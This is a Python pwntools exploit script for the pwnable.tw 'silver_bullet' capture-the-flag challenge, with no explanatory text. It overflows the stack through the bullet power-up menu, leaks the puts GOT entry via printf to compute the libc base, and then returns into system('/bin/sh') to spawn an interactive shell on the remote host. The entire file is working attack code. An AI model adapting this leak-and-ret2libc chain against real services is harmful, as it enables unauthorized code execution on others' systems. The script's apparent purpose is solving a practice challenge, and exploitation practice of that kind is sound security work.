from pwn import *

locdbg=False
syslibc32='/usr/lib/i386-linux-gnu/libc-2.31.so'
libcname='./libc_32.so.6'
elfname='./silver_bullet'
host='chall.pwnable.tw'
port=10103

elf=ELF(elfname)

if locdbg:
    p=process(elfname)
    libc=ELF(syslibc32)
    context.log_level='debug'
else:
    p=remote(host,port)
    libc=ELF(libcname)
    #context.log_level='debug'

def pwndbg():
    if locdbg:
        gdb.attach(p)

def cb(ctt):
    p.recvuntil('choice :')
    p.sendline('1')
    p.recvuntil('bullet :')
    p.send(ctt)

def pu(ctt):
    p.recvuntil('choice :')
    p.sendline('2')
    p.recvuntil('bullet :')
    p.send(ctt)

def bt():
    p.recvuntil('choice :')
    p.sendline('3')
    p.recvuntil('!!\x0a')

cb(b'1'*47)
pu(b'1')
pu(b'\xff\xff\xff'+b'aaaa'+p32(elf.plt['printf'])+p32(elf.symbols['main'])+p32(elf.got['puts']))
bt()
puts_addr=u32(p.recvuntil('+')[0:4])
print('puts-got= '+hex(puts_addr))
libc_base=puts_addr-libc.symbols['puts']
print('libc_base= '+hex(libc_base))
system_addr=libc_base+libc.symbols['system']
sh_addr=libc_base+next(libc.search(b'/bin/sh'))

cb(b'1'*47)
pu(b'1')
pu(b'\xff\xff\xff'+b'aaaa'+p32(system_addr)+p32(elf.symbols['main'])+p32(sh_addr))
bt()
p.interactive()